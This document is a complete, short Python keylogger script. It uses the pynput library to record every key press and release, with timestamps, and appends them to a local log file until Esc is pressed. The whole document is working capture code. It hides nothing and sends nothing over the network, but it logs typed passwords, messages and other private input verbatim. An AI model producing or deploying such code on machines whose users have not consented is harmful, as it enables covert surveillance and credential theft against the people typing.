#!/usr/bin/env python3

from pynput import keyboard
import time

def write_on_file(keys):
  with open("./logs/logs.txt", "a") as f:
    print(len(keys))
    for key in keys:
      f.write("{} ".format(key))
    f.write("\n")

def time_now():
  c_time = time.ctime().split(" ")[1:6]
  del c_time[1]
  return c_time

def on_press(key):
  keys = []
  keys.append("pressed")
  try:
    keys.append(key.char)
  except AttributeError:
    keys.append(key)
  keys.append(time_now())
  write_on_file(keys)

def on_release(key):
  keys = []
  keys.append("released")
  try:
    keys.append(key.char)
  except AttributeError:
    keys.append(key)
  if key == keyboard.Key.esc:
    return False
  keys.append(time_now())
  write_on_file(keys)

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
  listener.join()